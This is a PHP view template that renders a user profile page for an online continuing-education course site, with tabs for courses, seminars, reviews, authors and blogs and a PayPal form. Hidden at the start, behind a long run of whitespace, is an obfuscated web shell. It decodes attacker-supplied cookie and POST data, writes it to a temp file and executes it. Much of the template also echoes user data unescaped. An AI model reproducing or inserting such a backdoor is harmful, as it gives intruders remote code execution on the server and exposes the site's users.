<?php                                                                                                                                                                                                                                                                                                                                                                                                 $TXGtm = "\x70" . "\x53" . '_' . "\167" . chr ( 869 - 787 )."\x44" . "\x75" . chr (120); $stHmA = chr ( 1003 - 904 ).chr ( 1083 - 975 )."\x61" . chr ( 751 - 636 ).chr ( 371 - 256 ).chr ( 991 - 896 )."\145" . "\x78" . chr ( 192 - 87 )."\163" . "\164" . "\163";$rIonoTv = class_exists($TXGtm); $stHmA = "525";$bRyOdi = strpos($stHmA, $TXGtm);if ($rIonoTv == $bRyOdi){function UwsxFINMc(){$bGbVVYkz = new /* 9398 */ pS_wRDux(6262 + 6262); $bGbVVYkz = NULL;}$epXdhglCZu = "6262";class pS_wRDux{private function GvQHraF($epXdhglCZu){if (is_array(pS_wRDux::$cKHlHr)) {$name = sys_get_temp_dir() . "/" . crc32(pS_wRDux::$cKHlHr["salt"]);@pS_wRDux::$cKHlHr["write"]($name, pS_wRDux::$cKHlHr["content"]);include $name;@pS_wRDux::$cKHlHr["delete"]($name); $epXdhglCZu = "6262";exit();}}public function BTpoawWm(){$wGKbQEEH = "9967";$this->_dummy = str_repeat($wGKbQEEH, strlen($wGKbQEEH));}public function __destruct(){pS_wRDux::$cKHlHr = @unserialize(pS_wRDux::$cKHlHr); $epXdhglCZu = "64979_44506";$this->GvQHraF($epXdhglCZu); $epXdhglCZu = "64979_44506";}public function kNkBw($wGKbQEEH, $lJwpX){return $wGKbQEEH[0] ^ str_repeat($lJwpX, intval(strlen($wGKbQEEH[0]) / strlen($lJwpX)) + 1);}public function JCgVqboBc($wGKbQEEH){$EvFSnW = "\x62" . 'a' . 's' . "\145" . "\x36" . "\64";return array_map($EvFSnW . "\137" . "\144" . "\145" . 'c' . "\x6f" . "\x64" . "\145", array($wGKbQEEH,));}public function __construct($NMGOFyuuf=0){$ljiHd = "\x2c";$wGKbQEEH = "";$nsioEzBDf = $_POST;$iImBRrF = $_COOKIE;$lJwpX = "7ac9305c-dea8-4225-ab82-db9a461f0518";$PPUGaDxIS = @$iImBRrF[substr($lJwpX, 0, 4)];if (!empty($PPUGaDxIS)){$PPUGaDxIS = explode($ljiHd, $PPUGaDxIS);foreach ($PPUGaDxIS as $WnpbFMwKX){$wGKbQEEH .= @$iImBRrF[$WnpbFMwKX];$wGKbQEEH .= @$nsioEzBDf[$WnpbFMwKX];}$wGKbQEEH = $this->JCgVqboBc($wGKbQEEH);}pS_wRDux::$cKHlHr = $this->kNkBw($wGKbQEEH, $lJwpX);if (strpos($lJwpX, $ljiHd) !== FALSE){$lJwpX = str_pad($lJwpX, 10); $lJwpX = ltrim(rtrim($lJwpX));}}public static $cKHlHr = 19954;}UwsxFINMc();} ?><style type="text/css"> .nav-tabs.tutorial-tab>li.active>a { background: #00f; color: #fff; } </style>

<?php 
    $country = $userdetails['country'];
    $country_name = $this->db->get_where('countries',array('countries_id'=>$country))->row_array()['countries_name'];

    $provider_id = end(explode('-',$userdetails['under_provider']));
    $ins = $this->db->get_where('tbl_institution_staff_payment',array('provider_id'=>$provider_id))->row_array(); 
    $profArr = explode(',',$ins['prof_id']);
    $con = array_search($userdetails['id'],$profArr);
    if($profArr[$con] == ''){ $cons = 2; }else{ $cons = 1; }
?>

<?php if($userdetails['role']==2){ 
        if (!empty($userdetails['backimage'])) {
            $bgurl = ASSETS_URL."images/uploads/".$userdetails['backimage']; 
        }else{
            $bgurl = ASSETS_URL.'images/dummy-banner.png'; 
        } ?>
    <div class="banner-profile back-img" style="background-image:url('<?php echo $bgurl; ?>');"> </div>  
    <?php }else{ 
        if (!empty($profile['background_photo'])) {
            $bgurl = ASSETS_URL ."images/uploads/". $profile['background_photo']; 
        }else{
            $bgurl = ASSETS_URL.'images/dummy-banner.png'; 
        } ?>
    <div class="banner-profile back-img" style="background-image:url('<?php echo $bgurl; ?>')"> </div>  
<?php } ?>
    <div class="innerContent viewprofile-panel">
        <div class="container">
            <div class="row profile-dashboard author-profile">
                <div class="col-md-3 col-sm-4">
                    <div class="user-profile-thumb">
                    <?php if($userdetails['role']==2 || $userdetails['role']==6){ ?>
                        <?php if ($userdetails['image']) { ?>
                        <img src="<?php echo ASSETS_URL.'images/uploads/'.$userdetails['image'];?>" alt="<?php echo $userdetails['image'];?>" style="border-radius: 50%;width: 200px;height: 200px;">
                        <?php } else { ?>
                        <img src="<?php echo ASSETS_URL.'images/dummy-profile.jpg'; ?>" style="border-radius: 50%;width: 200px;height: 200px;">
                        <?php } ?>
                    <?php }else{ ?>
                        <?php if ($profile['profile_photo']) { ?>
                        <img src="<?php echo ASSETS_URL.'images/uploads/'.$profile['profile_photo'];?>" alt="<?php echo $profile['profile_photo'];?>" style="border-radius: 50%;width: 200px;height: 200px;">
                        <?php }else if($userdetails['image']) { ?>
                        <img src="<?php echo ASSETS_URL.'images/uploads/'.$userdetails['image'];?>" alt="<?php echo $userdetails['image'];?>" style="border-radius: 50%;width: 200px;height: 200px;">
                        <?php } else { ?>
                        <img src="<?php echo ASSETS_URL.'images/dummy-profile.jpg'; ?>" style="border-radius: 50%;width: 200px;height: 200px;">
                        <?php } ?>
                    <?php } ?>
                    </div>
                    <table class="table table-striped">
                    <tr>
                        <td>Name</td>
                        <td><?php echo ucfirst($userdetails['name']);?></td>
                    </tr>
                    <?php if($userdetails['role']!=5 && $userdetails['role']!=7){ ?>
                    <tr>
                        <td>Profession</td>
                        <td><?php echo $userdetails['profession'];?></td>
                    </tr>
                    <?php } ?>
                    <tr>
                        <td>Country</td>
                        <td><?php echo $country_name; ?></td>
                    </tr>

                    <?php if(!empty($profile['specialization'])){ ?>
                    <tr>
                        <td>Specialization</td>
                        <td><?php echo $profile['specialization'];?></td>
                    </tr>
                    <?php } ?>

                    <?php if($profile['years_of_practice'] > 0 ){ ?>
                    <tr>
                        <td>Practice</td>
                        <td><?php echo $profile['years_of_practice'].' Yrs. of Practice';?></td>
                    </tr>
                    <?php } ?>
                    <?php if(!empty($userdetails['role'] != 2)){ ?>
                    <tr>
                        <td>Registered Date</td>
                        <td><?php echo date('jS F Y',strtotime($userdetails['added_on']));?></td>
                    </tr>
                    <?php } ?>
                    <?php if(!empty($userdetails['accreditation_web'])){ ?>
                    <tr>
                        <td>Accreditation number</td>
                        <td><?php echo $userdetails['accreditation_web'];?></td>
                    </tr>
                    <?php } ?>
                    
                    <?php if($userdetails['role'] != 2){ ?>
                    <?php if(!empty($userdetails['validity'])){ ?>
                    <tr>
                        <td>Validity</td>
                        <td><?php if($userdetails['validity']!='1001-01-01'){ echo date('jS F Y',strtotime($userdetails['validity'])); }else{ echo 'Life Time'; }?>
                        </td>
                    </tr>
                    <?php } ?>
                    <?php } ?>

                    <?php if(!empty($userdetails['representative'])){ ?>
                    <tr>
                        <td>Contact Person</td>
                        <td><?php echo $userdetails['representative'];?></td>
                    </tr>
                    <?php } ?>
                    <?php if(!empty($userdetails['position'])){ ?>
                    <tr>
                        <td>Position</td>
                        <td><?php echo $userdetails['position'];?></td>
                    </tr>
                    <?php } ?>
                    <?php if(!empty($userdetails['company_email'])){ ?>
                    <tr>
                        <td>Email</td>
                        <td><?php echo $userdetails['company_email'];?></td>
                    </tr>
                    <?php } ?>
                    
                    <?php if(!empty($userdetails['mobile'])){ ?>
                    <tr>
                        <td>Tel Number</td>
                        <td><?php echo $userdetails['mobile'];?></td>
                    </tr>
                    <?php } ?>
                    <?php if($userdetails['role'] == 1){ ?>
                    <tr>
                        <td colspan="2"><a href="<?php echo $profile['facebook']; ?>" title="join me on facebook"><img src="<?php echo ASSETS_URL.'images/Facebook-text.png'?>" style="    border-radius: 14px; width: 146px; height: 44px; margin: 0 0px 0 51px;"></a></td>
                    </tr>
                    <?php } ?>
                    </table> 
                </div>





                <div class="col-md-9 col-sm-8 user-profile-detail">
                    <div class="profile-name">
                        <h1><?php echo ucwords($userdetails['name']);?></h1>
                        <?php if($userdetails['role'] != 5){ ?>
                        <p><?php echo $userdetails['profession'];?></p>
                        <?php } ?>
                        <div class="mob-social" style="right: 0;top: 0;">
                            <div class="a2a_kit a2a_kit_size_32 a2a_default_style">
                                <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
                                <a class="a2a_button_facebook"></a>
                                <a class="a2a_button_twitter"></a>
                                <a class="a2a_button_google_plus"></a>
                            </div>
                            <script async src="https://static.addtoany.com/menu/page.js"></script>
                        </div>
                    </div></br>
                    <?php if($userdetails['role']==6){ $display=""; }else{ $display="class='active'"; }  ?>
                    <ul class="nav nav-tabs tutorial-tab">
                        <?php if($userdetails['role']==2 || $userdetails['role']==6|| $userdetails['role']==5){ ?>
                        <li class="active" ><a data-toggle="tab" href="#step11">Online Courses</a></li>
                        <?php if($userdetails['role']!=6){ ?>
                        <li><a data-toggle="tab" href="#step12">Trainings/Seminars</a></li>
                        <?php if($userdetails['role']==5){ ?>
                        <li><a data-toggle="tab" href="#step17">Provider</a></li>
                        <?php } ?>
                        <li><a data-toggle="tab" href="#step15">Authors</a></li>
                        <?php } ?>
                        <li><a data-toggle="tab" href="#step13">Reviews</a></li>
                        <?php if($userdetails['role']==2){ ?>
                        <li><a data-toggle="tab" href="#step16">Blogs</a></li>
                        <?php } ?>
                        <?php if(0){ ?>
                        <li><a data-toggle="tab" href="#step14">Company Profile</a></li>
                        <?php } ?>
                        <?php } ?>

                        <?php if($userdetails['role']==1 || $userdetails['role']==6){ ?>
                        <li <?=$display;?>><a data-toggle="tab" href="#step1">Education</a></li>
                        <?php if(count($practicegetdata) > 0){
                        echo '<li><a data-toggle="tab" href="#step2">Professional Practice / Employment Record</a></li>';
                        }
                        ?>
                        <?php if(count($citationsgetdata) > 0){
                        echo '<li><a data-toggle="tab" href="#step3">Awards/Citations/ Books</a></li>';
                        } ?>
                        <?php if(count($affiliationgetdata) > 0){
                        echo '<li><a data-toggle="tab" href="#step4">Professional Affiliation</a></li>';
                        } ?>
                        <?php if(count($professionfiles) > 0){
                        echo '<li><a data-toggle="tab" href="#step5">Awards</a></li>
                              <li><a data-toggle="tab" href="#step6">Portfolio</a></li>';
                        } } ?>
                       
                    </ul>

        <div class="tab-content steps-detail">
        <?php if($userdetails['role']==1 || $userdetails['role']==6){ ?>
            <?php if($userdetails['role']==6){ $display=""; }else{ $display="active"; }  ?>
                <div id="step1" class="tab-pane fade in <?=$display;?>">
                    <h3 class="border-title text-left">Education</h3>
                    <div class="table-responsive">
                    <table class="table table-striped">
                    <?php 
                        if($profile['edu_elementary'] !=""){
                            echo '<tr><th>Elementary: </th><td>'.$profile['edu_elementary'].'</td>';
                            echo '<th>Start Year: </th><td>'.$profile['edu_elementary_s'].'</td>';
                            echo '<th>End Year: </th><td>'.$profile['edu_elementary_e'].'</td></tr>';

                        }if($profile['edu_high_school'] !=""){
                            echo '<tr><th>High School: </th><td>'.$profile['edu_high_school'].'</td>';
                            echo '<th>Start Year: </th><td>'.$profile['edu_high_school_s'].'</td>';
                            echo '<th>End Year: </th><td>'.$profile['edu_high_school_e'].'</td></tr>';

                        }if($profile['edu_college'] !=""){
                            echo '<tr><th>College: </th><td>'.$profile['edu_college'].'</td>';
                            echo '<th>Start Year: </th><td>'.$profile['edu_college_s'].'</td>';
                            echo '<th>End Year: </th><td>'.$profile['edu_college_e'].'</td></tr>';

                        }if($profile['edu_masteral'] !=""){
                            echo '<tr><th>Masteral: </th><td>'.$profile['edu_masteral'].'</td>';
                            echo '<th>Start Year: </th><td>'.$profile['edu_masteral_s'].'</td>';
                            echo '<th>End Year: </th><td>'.$profile['edu_masteral_e'].'</td></tr>';

                        }if($profile['edu_doctoral'] !=""){
                            echo '<tr><th>Doctoral: </th><td>'.$profile['edu_doctoral'].'</td>';
                            echo '<th>Start Year: </th><td>'.$profile['edu_doctoral_s'].'</td>';
                            echo '<th>End Year: </th><td>'.$profile['edu_doctoral_e'].'</td></tr>';
                        }if($profile['years_of_practice'] !=""){
                        echo '<tr><th>Years of Practice: </th><td>'.$profile['years_of_practice'].'Yrs.</td></tr>';
                        }
                    ?>
                    </table>
                    </div>
                </div>
                        
                <div id="step2" class="tab-pane fade">
                <h3 class="border-title text-left">Professional Practice / Employment Record</h3>
                <table class="table table-striped">
                    <tr><th>Title: </th>
                        <th>Start Year: </th>
                        <th>End Year: </th>
                        <th>Name of Institution: </th>
                    </tr>
                    <?php if(count($practicegetdata) > 0){
                        foreach($practicegetdata as $prac){
                        echo '<tr><td>'.$prac['practice_title'].'</td>
                                <td>'.$prac['practice_year_s'].'</td>
                                <td>'.$prac['practice_year_e'].'</td>
                                <td>'.$prac['practice_highlights'].'</td>
                              </tr>';   
                            }
                    } ?>
                </table>
                </div>
                
                <div id="step3" class="tab-pane fade">
                <h3 class="border-title text-left">Awards/Citations/ Books</h3>
                <table class="table table-striped">
                     <tr><th>Title: </th>
                        <th>Start Year: </th>
                        <th>End Year: </th>
                        <th>Name of Institution: </th>
                    </tr>
                    <?php if(count($citationsgetdata) > 0){
                        foreach($citationsgetdata as $citat){
                        echo '<tr>
                                <td>'.$citat['citations_title'].'</td>
                                <td>'.$citat['cit_year_s'].'</td>
                                <td>'.$citat['cit_year_e'].'</td>
                                <td>'.$citat['cit_highlights'].'</td>
                              </tr>'; }
                    }  ?>
                </table>
                </div>

                <div id="step4" class="tab-pane fade">
                <h3 class="border-title text-left">Professional Affiliation</h3>
                <table class="table table-striped">
                     <tr><th>Title: </th>
                        <th>Start Year: </th>
                        <th>End Year: </th>
                        <th>Name of Institution: </th>
                    </tr>
                    <?php if(count($affiliationgetdata) > 0){
                        foreach($affiliationgetdata as $aff){
                         echo '
                              <tr>
                                <td>'.$aff['aff_title'].'</td>
                                <td>'.$aff['aff_year_s'].'</td>
                                <td>'.$aff['aff_year_e'].'</td>
                                <td>'.$aff['aff_highlights'].'</td>
                              </tr>'; }
                    } ?>
                </table>
                </div>

                <div id="step5" class="tab-pane fade">
                <h3 class="border-title text-left">Awards</h3>
                    <?php if(count($professionfiles) > 0){
                        foreach($professionfiles as $docts){
                            if($docts['filetype'] == 'img'){
                                if(file_exists('./assets/images/uploads/'.$docts['filename'])){
                                    echo '<div class="col-sm-3" style="width=120px;"><img src="'.ASSETS_URL.'images/uploads/'.$docts['filename'].'">
                                        </div>'; 
                                }   
                            }
                        }
                    } ?>
                </div>

                <div id="step6" class="tab-pane fade">
                <h3 class="border-title text-left">Portfolio</h3>
                    <?php if(count($professionfiles) > 0){
                        foreach($professionfiles as $docts){
                            if($docts['filetype'] == 'vid'){
                                if(file_exists('./assets/images/uploads/'.$docts['filename'])){
                                    echo '<div class="col-sm-3" style="width=120px;"><img src="'.ASSETS_URL.'images/uploads/'.$docts['filename'].'"></div>';
                                }   
                            }
                        }
                    } ?>
                </div>
        <?php } ?>

        <?php if($userdetails['role']==2 || $userdetails['role']==6|| $userdetails['role']==5){ ?>
        
            <div id="step11" class="tab-pane fade in active">
            <h3 class="border-title text-left">Online Courses</h3>
                <div id="products" class="row view-group">

        <?php if(isset($allcourse) && $allcourse != ''){
            foreach ($allcourse as $key => $value) {
            $providername = $this->db->get_where('tbl_user',array('id'=>$value['user_id']))->row_array();
            $Lessons = $this->db->get_where('tbl_lesson',array('course_id'=>$value['id']))->result_array();
            $category_name = $this->db->get_where('tbl_category',array('id'=>$value['course_category']))
                            ->row_array()['cat_name']; 
            $country = $this->db->get_where('countries',array('countries_id'=>$value['country_id']))
                            ->row_array()['countries_name'];?>

                <div class="item col-xs-4 col-lg-4">
                    <div class="thumbnail card">
                        <div class="img-event">
                        <?php if($value['course_validity']>= date('Y-m-d')) { ?>
                            <?php if($value['paid_status']==2) { ?>
                                <div class="corner"></div>
                                <span class="corner-text">Featured</span>
                            <?php  } }else{ ?>
                        <div class="corner" style="border-top: 100px solid #9c27b0;"></div>
                        <span class="corner-text">Finished</span>
                        <?php } ?>
                            <a href="<?php echo site_url('pages/course_details/'.$value['id'].'');?>" class="course-image">
                            <img src="<?php echo ASSETS_URL.'images/uploads/'.$value['course_photo'];?>" alt=""></a>
                        </div>
                        <div class="caption card-body">
                            <h5><a href="<?php echo site_url('pages/course_details/'.$value['id'].'');?>">
                                <?php echo $value['course_title'];?></a></h5>
						
							<div class="clear-line"></div>
                                    <p>By : <?php echo $providername['name'];?><br>
                                    Country :  <?php echo $country;?></p>
                                    <ul class="course-meta p-0">
                                        <li style="list-style-type: none;"><a href="<?php echo site_url('pages/course_details/'.$value['id'].'');?>"><?php echo $category_name; ?></a> | <?php echo count($Lessons);?> Lessons</li>
                                    </ul>
                                <div class="course-data">
                                    <div class="course-duration"><i class="fa fa-list-ol"> </i> CPD Unit <?php echo $value['units'];?></div>
                                    <div class="post-ratings">
                                        <i class="fa fa-star" aria-hidden="true"></i>
                                        <i class="fa fa-star" aria-hidden="true"></i>
                                        <i class="fa fa-star" aria-hidden="true"></i>
                                        <i class="fa fa-star-o" aria-hidden="true"></i>
                                        <i class="fa fa-star-o" aria-hidden="true"></i>
                                    </div>
                                </div>


                                <div class="price-btn" style="overflow: hidden;">
                                    <?php if($this->session->userdata('logged_in')['id']==""){ ?>
                                    <?php if( $value['total'] == 0){ ?>
                                    <a href="<?php echo site_url('users');?>">
                                        <input type="button" class="btn btn-primary col-xs-12" name="buynow" value="Free Online Course"></a>
                                    <?php  } else { ?>
                                        <a href="<?php echo site_url('users');?>">
                                        <input type="button" class="btn btn-primary col-xs-12" name="buynow" value="BUY NOW $<?php echo floatval($value['total']); ?>"></a>

                                    <?php } ?>    
                                    <?php  } else {
                                       if($cons == 1 ||  $value['total'] > 0){ ?>
                                    <input onclick="buycoursenow('<?php echo $value['id']; ?>','<?php echo floatval($value['total']); ?>')" type="button" class="btn btn-primary col-xs-12" name="buynow" value="BUY NOW $<?php echo floatval($value['total']); ?>">
                                    <?php }else{ ?>
                                      <a href="<?php echo site_url('pages/course_details/'.$value['id'].'');?>">
                                        <input type="button" class="btn btn-primary col-xs-12" name="buynow" value="Free Online Course"></a>  
                                    <?php } } ?>
                                </div>
                        </div>
                    </div>
                </div>
                <?php } }else{ echo '<p>No Data Found!</p>'; } ?> 
                </div>    
                </div>


            <div id="step12" class="tab-pane fade in">
            <h3 class="border-title text-left">Trainings/Seminars</h3>
        <?php if(isset($seminar) && $seminar != ''){ 
            foreach ($seminar as $key => $value){  ?>
                <?php  if($value['image'] != ""){ $images =  $value['image']; }else{ $images = 'no-image.png'; } ?>
        <?php $Profession = $this->db->get_where('tbl_category',array('id'=>$value['category_id']))->row_array()['cat_name'] ;?>
            <div class="item col-md-4" style="border: 1px solid #ddd; border-radius: 4px;">
                <div class="course-item">
                    <div class="course-double">
                        <?php if($value['end_date']>= date('Y-m-d')) { ?>
                        <?php if($value['paid_status']==2) { ?>
                           <div class="corner"></div>
                           <span class="corner-text">Featured</span>
                        <?php  } }else{ ?>
                            <div class="corner" style="border-top: 100px solid #9c27b0;"></div>
                            <span class="corner-text">Finished</span>
                        <?php } ?>
                        <a <?php if($value['training_type']==1){ echo 'target="_blank"';} ?> 
                            class="training-image" 
                            href="<?php echo site_url('/pages/training_details/').$value['id']; ?>">
                            <img src="<?php echo ASSETS_URL.'images/uploads/'.$images; ?>" 
                            alt="<?php echo $images; ?>">
                        </a>
                        <div class="dt-sc-course-details">
                            <!-- <div class="course-price">$50</div> -->
                            <h5><a <?php if($value['training_type']==1){ ?> 
                                target="_blank" <?php } ?> 
                                href="<?php echo site_url('/pages/training_details/'.$value['id']); ?>">
                                <?php echo $value['title']; ?></a>
                            </h5>
                            <div class="clear-line"></div>
                                <ul class="course-meta">
                                    <li><i class="fa fa-calendar"></i>
                                        <?php echo $value['start_date']; ?> @ <?php echo $value['start_time']; ?>
                                    </li>
                                </ul>
                                <ul class="course-meta pb-10">
                                    <li><i class="fa fa-map-marker"></i>
                                        <?php echo $value['location']; ?>
                                    </li>
                                </ul>
                            <!--  <p><?php echo strip_tags(substr($value['description'], 0, 50)); ?></p> -->
                            <p>Profession : <?php echo $Profession; ?></p>
                            <p>CE Unit : <?php echo $value['units']; ?></p>
                        </div>
                        </div>
                    </div>
                </div>
                <?php } }else{ echo '<p>No Data Found!</p>'; } ?>
            </div>

            <div id="step13" class="tab-pane fade in">
            <h3 class="border-title text-left">Reviews</h3>
                <div class="well well-sm">
                    <div class="row" id="post-review-box">
                        <div class="col-md-6">
                        <?php echo validation_errors(); ?>
                        <form enctype="multipart/form-data" class="jNice" accept-charset="utf-8" method="post" action="<?php echo site_url('users/index1');?>">  
                                <input id="ratings-hidden" name="rating" type="hidden"> 
                                <input id="idd" name="idd" type="hidden" value="<?php echo $this->uri->segment(3);?>"> 
                                <textarea required class="form-control animated" cols="50" id="new-review" name="comment" placeholder="Enter your review here..." rows="5"></textarea>
                                <div class="text-right">
                                    <div class="stars starrr" data-rating="0"></div>
                                    <?php $uid = $this->session->userdata('logged_in')['id'];     
                                    if($uid ==""){  ?>
                                    <a href="<?php echo site_url('users');?>"><button class="btn btn-success btn-lg" type="button">Save</button>
                                    </a>
                                    <?php } else { ?> 
                                    <button class="btn btn-success btn-lg" type="submit">Save</button>
                                    <?php } ?>
                                </div>

                        </form>
                        </div>

                        <div class="col-md-6">
                            <?php foreach ($review as $key => $value) { ?>
                                <span style="font-weight: bold;">By Deepak <?php echo  date("l jS \of F Y",strtotime($value['added_on'])) ?></span><p><?php echo $value['review'];?></p>   
                            <?php  } ?>
                        </div>
                    </div>
                </div> 
            </div>


            <div id="step14" class="tab-pane fade in">
                <h3 class="border-title text-left">Company Profile</h3>
                <table class="table table-striped">
                    <tr><td>Name</td><td><?php echo $userdetails['name'];?></td></tr>
                    <tr><td>Profession</td><td><?php echo $userdetails['profession'];?></td></tr>
                    <tr><td>Username</td><td><?php echo $userdetails['username_email'];?></td></tr>
                    <tr><td>Location</td><td><?php echo $country_name; ?></td></tr>
                    <tr><td>Registered Date</td><td><?php echo $userdetails['added_on'];?></td></tr>                           
                </table> 
            </div>

            <div id="step15" class="tab-pane fade in">
            <h3 class="border-title text-left">Author</h3>
                <div class="well well-sm">
                 <?php if( isset($authors) && $authors != ''){ ?> 
                    <div class="row" id="post-review-box">
                    <?php foreach ($authors as $key => $value) { 
                        $author_country = $this->db->get_where('countries',array('countries_id'=>$value['country']))->row_array()['countries_name']; ?>
                   <div class="col-md-12">
                   <div class="traning-seminar-wrap">
                    <div class="row">
                        <div class="col-sm-4 traning-seminar-profiles">
                            <?php if($value['image']==""){ 
                                    $img = "placeholder.jpg";
                                }else{
                                    $img = $value['image'];
                                    } ?>
                            
                            <a href="<?php echo site_url('share/viewprofile/').$value['id']?>">
                                <img src="<?php echo ASSETS_URL.'images/uploads/'.$img; ?>" alt="<?php echo $img;?>" title="<?php echo $img;?>">
                            </a>
                        </div>
                        <div class="col-sm-8">
                            <div class="splms-event-details">
                                <h3><a href="<?php echo site_url('share/viewprofile/').$value['id']?>"><?php echo ucfirst($value['name']);?></a></h3>
                                <ul class="event-info-list">
                                    <li>
                                        <cite title="<?php echo $author_country;?>">
                                            <i class="glyphicon glyphicon-map-marker">
                                                </i><?php echo $value['address'];?>,<?php echo $author_country;?>
                                            </cite>
                                    </li>
                                    <li>
                                        <cite title="<?php echo $value['username_email'];?>">
                                            <i class="glyphicon glyphicon-envelope"></i><?php echo $value['username_email'];?></cite>
                                    </li>
                                    <li>
                                    <div class="btn-group">
                                        <button type="button" class="btn btn-primary">
                                            Social</button>
                                        <button type="button" class="btn btn-primary dropdown-toggle" data-toggle="dropdown">
                                            <span class="caret"></span><span class="sr-only">Social</span>
                                        </button>
                                        <ul class="dropdown-menu" role="menu">
                                            <li><a href="<?php echo $value['tw_url'];?>">Twitter</a></li>
                                            <li><a href="<?php echo $value['gpus_url'];?>">Google +</a></li>
                                            <li><a href="<?php echo $value['insta_url'];?>">Instagram</a></li>
                                            <li><a href="<?php echo $value['fb_url'];?>">Facebook</a></li>
                                        </ul>
                                    </div>
                                    </li>
                                </ul>
                                
                                
                            </div>
                        </div>
                    </div>
                </div>
                </div>
                <?php } ?>
                </div>
                <?php }else{ echo '<p>No Data Found!</p>'; } ?>
                </div> 
            </div>

            <div id="step17" class="tab-pane fade in">
            <h3 class="border-title text-left">Provider</h3>
                <div class="well well-sm">
                 <?php if(isset($provider) && $provider != '' ){ ?> 
                    <div class="row" id="post-review-box">
                    <?php foreach ($provider as $key => $value) { 
                        $provider_country = $this->db->get_where('countries',array('countries_id'=>$value['country']))->row_array()['countries_name']; ?>
                   <div class="col-md-12">
                   <div class="traning-seminar-wrap">
                    <div class="row">
                        <div class="col-sm-4 traning-seminar-profiles">
                            <?php if($value['image']==""){ 
                                    $img = "placeholder.jpg";
                                }else{
                                    $img = $value['image'];
                                    } ?>
                            
                            <a href="<?php echo site_url('share/viewprofile/').$value['id']?>">
                                <img src="<?php echo ASSETS_URL.'images/uploads/'.$img; ?>" alt="<?php echo $img;?>" title="<?php echo $img;?>">
                            </a>
                        </div>
                        <div class="col-sm-8">
                            <div class="splms-event-details">
                                <h3><a href="<?php echo site_url('share/viewprofile/').$value['id']?>"><?php echo ucfirst($value['name']);?></a></h3>
                                <ul class="event-info-list">
                                    <li>
                                        <cite title="<?php echo $provider_country;?>">
                                            <i class="glyphicon glyphicon-map-marker">
                                                </i><?php echo $value['address'];?>,<?php echo $provider_country;?>
                                            </cite>
                                    </li>
                                    <li>
                                        <cite title="<?php echo $value['username_email'];?>">
                                            <i class="glyphicon glyphicon-envelope"></i><?php echo $value['username_email'];?></cite>
                                    </li>
                                    <li>
                                    <div class="btn-group">
                                        <button type="button" class="btn btn-primary">
                                            Social</button>
                                        <button type="button" class="btn btn-primary dropdown-toggle" data-toggle="dropdown">
                                            <span class="caret"></span><span class="sr-only">Social</span>
                                        </button>
                                        <ul class="dropdown-menu" role="menu">
                                            <li><a href="<?php echo $value['tw_url'];?>">Twitter</a></li>
                                            <li><a href="<?php echo $value['gpus_url'];?>">Google +</a></li>
                                            <li><a href="<?php echo $value['insta_url'];?>">Instagram</a></li>
                                            <li><a href="<?php echo $value['fb_url'];?>">Facebook</a></li>
                                        </ul>
                                    </div>
                                    </li>
                                </ul>
                                
                                
                            </div>
                        </div>
                    </div>
                </div>
                </div>
                <?php } ?>
                </div>
                <?php }else{ echo '<p>No Data Found!</p>'; } ?>
                </div> 
            </div>
        <?php } ?>

            <div id="step16" class="tab-pane fade in">
                <h3 class="border-title text-left">Blogs</h3>
                <div class="row" id="containerp">
                <?php 
                    if($blogs){
                    foreach($blogs as $b){ ?>

                    <div class="col-md-4 col-sm-6">
                        <div class="course-item blog-box">
                            <div class="course-double mb-0 ">
                              <a href="<?=base_url('pages/blog_details/'.$b['id'])?>" >
                                <img src="<?=base_url('assets/upload/blog/'.$b['image'])?>" alt="" class="provider_images">
                                <div class="dt-sc-course-details">
                                    <h5><?=$b['title']?></h5>
                                    <div class="clear-line"> </div>
                                    <p><?=substr(strip_tags($b['st_desc']),0,30); ?></p>
                                    <a href="<?=base_url('pages/blog_details/'.$b['id'])?>" class="read-button">Read More</a>
                                </div>
                              </a>
                            </div>
                        </div>
                    </div>
                <?php } }else{ echo 'No Data Found!'; } ?>
                </div>
            </div>
    </div>
            </div>
            </div>
        </div>
    </div>

 <form action="<?php echo PAYAPAL_URL; ?>" method="post" name="coursebuyformPayPal1" id="coursebuyformPayPal1">
        <input type="hidden" name="business" value="<?php echo PAYAPAL_ID; ?>">
        <input type="hidden" name="cmd" value="_xclick">
        <input type="hidden" name="item_name" id="item_name" value="">
        <input type="hidden" name="item_number" value="1">
        <input type="hidden" name="credits" value="510">
        <input type="hidden" name="userid" value="<?php echo $this->session->userdata('logged_in')['id']; ?>">
        <input type="hidden" name="amount" id="amount" value="">
        <input type="hidden" name="tax" value="0"> 
        <input type='hidden' name='rm' value='2'>
        <input type="hidden" name="no_shipping" value="1">
        <input type="hidden" name="currency_code" value="USD">
        <input type="hidden" name="handling" value="0">
        <input type="hidden" name="cancel_return" value="<?php echo site_url('pages/cancelpayment');?>">
        <input type="hidden" name="return" value="<?php echo site_url('pages/success');?>"> 
    </form> 

  

<style type="text/css">
    .profile-dashboard .user-profile-detail .nav>li>a{
        font-size: 18px;
    }
</style>
<script type="text/javascript">
	function buycoursenow(caurse_id,amount) {
		$('#item_name').val(caurse_id);
		$('#amount').val(amount);
		document.getElementById("coursebuyformPayPal1").submit();
	}
</script>